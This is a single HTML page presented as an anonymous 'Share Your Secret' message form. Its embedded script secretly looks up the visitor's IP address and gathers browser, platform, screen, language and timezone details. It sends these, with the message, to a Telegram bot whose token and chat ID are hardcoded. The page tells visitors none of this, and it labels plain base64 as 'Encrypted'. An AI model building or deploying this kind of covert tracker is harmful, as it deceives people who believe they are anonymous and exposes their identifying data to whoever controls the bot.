<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secret Message</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: linear-gradient(135deg, #1e1e1e, #3b3b3b);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Inter', sans-serif;
            color: #f3f4f6;
        }
        .container {
            background: #252525;
            border-radius: 1rem;
            padding: 2rem;
            box-shadow: 0 0 30px rgba(236, 72, 153, 0.4);
        }
        textarea {
            background: #2f2f2f;
            border: 2px solid #ec4899;
            border-radius: 0.5rem;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            border-color: #f9a8d4;
        }
        .send-btn {
            background: linear-gradient(90deg, #ec4899, #f9a8d4);
        }
        .send-btn:hover {
            background: linear-gradient(90deg, #db2777, #ec4899);
        }
    </style>
</head>
<body class="antialiased">
    <div class="w-full max-w-md p-6">
        <div class="container">
            <h1 class="text-2xl font-bold text-center mb-4 text-pink-300">Share Your Secret 🤫</h1>
            <textarea id="message" rows="5" class="w-full text-gray-200 rounded-md p-3 focus:outline-none resize-none" placeholder="Type your secret message..."></textarea>
            <button id="sendBtn" class="send-btn mt-4 w-full text-white font-semibold py-2 rounded-md transition duration-300">Send Secretly 🚀</button>
            <p id="status" class="mt-3 text-center text-sm text-gray-400"></p>
        </div>
    </div>

    <script>
        async function getUserInfo() {
            const response = await fetch('https://api.ipify.org?format=json');
            const ipData = await response.json();
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const browser = navigator.appName || 'Unknown';
            const language = navigator.language;
            const screen = `${window.screen.width}x${window.screen.height}`;
            const timestamp = new Date().toISOString();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            return {
                ip: ipData.ip,
                userAgent,
                platform,
                browser,
                language,
                screen,
                timestamp,
                timezone
            };
        }

        async function sendToTelegram(message, userInfo) {
            const botToken = '8179260298:AAECPoAzoyCu3l3vK4Uxeg3qdVlMO4wJfwE'; // Replace with your bot token
            const chatId = '1987268737'; // Replace with your chat ID
            const encryptedMessage = btoa(message);
            const text = `
*🔒 New Secret Message 🔒*
📝 *Message*: ${message}
🔐 *Encrypted*: ${encryptedMessage}
🌐 *IP*: ${userInfo.ip}
📱 *Device*: ${userInfo.userAgent}
💻 *Platform*: ${userInfo.platform}
🌍 *Browser*: ${userInfo.browser}
🗣️ *Language*: ${userInfo.language}
🖥️ *Screen*: ${userInfo.screen}
⏰ *Time*: ${userInfo.timestamp}
🌎 *Timezone*: ${userInfo.timezone}
            `;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        document.getElementById('sendBtn').addEventListener('click', async () => {
            const message = document.getElementById('message').value.trim();
            const status = document.getElementById('status');
            const sendBtn = document.getElementById('sendBtn');

            if (!message) {
                status.textContent = 'Please write a message! 🚫';
                status.classList.add('text-red-500');
                return;
            }

            sendBtn.disabled = true;
            sendBtn.textContent = 'Sending...';
            status.textContent = '';

            const userInfo = await getUserInfo();
            const sent = await sendToTelegram(message, userInfo);

            if (sent) {
                status.textContent = 'Message sent successfully! ✅';
                status.classList.remove('text-red-500');
                status.classList.add('text-green-500');
                document.getElementById('message').value = '';
            } else {
                status.textContent = 'Failed to send message. Try again. ❌';
                status.classList.add('text-red-500');
            }

            sendBtn.disabled = false;
            sendBtn.textContent = 'Send Secretly 🚀';
        });

        // Character counter
        const textarea = document.getElementById('message');
        textarea.addEventListener('input', () => {
            const count = textarea.value.length;
            const status = document.getElementById('status');
            status.textContent = `${count}/500 characters`;
            if (count > 500) {
                status.classList.add('text-red-500');
                textarea.value = textarea.value.substring(0, 500);
            } else {
                status.classList.remove('text-red-500');
            }
        });

        // Auto-save draft to localStorage
        textarea.addEventListener('input', () => {
            localStorage.setItem('secretDraft', textarea.value);
        });

        // Load draft on page load
        window.addEventListener('load', () => {
            const draft = localStorage.getItem('secretDraft');
            if (draft) {
                textarea.value = draft;
                document.getElementById('status').textContent = 'Draft loaded! 📝';
            }
        });

        // Clear draft after successful send
        document.getElementById('sendBtn').addEventListener('click', () => {
            if (document.getElementById('status').textContent.includes('successfully')) {
                localStorage.removeItem('secretDraft');
            }
        });

        // Keyboard shortcut for sending (Ctrl+Enter)
        textarea.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'Enter') {
                document.getElementById('sendBtn').click();
            }
        });

        // Auto-resize textarea
        textarea.addEventListener('input', () => {
            textarea.style.height = 'auto';
            textarea.style.height = `${textarea.scrollHeight}px`;
        });
    </script>
</body>
</html>
